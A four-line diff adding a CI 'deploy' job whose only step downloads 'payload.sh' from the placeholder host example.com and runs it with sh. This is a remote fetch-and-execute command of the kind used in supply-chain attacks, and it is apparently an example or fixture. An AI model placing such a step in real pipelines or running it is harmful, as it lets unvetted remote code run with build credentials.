@@ -1,0 +1,4 @@
+deploy:
+  image: alpine:3.19
+  script:
+    - curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
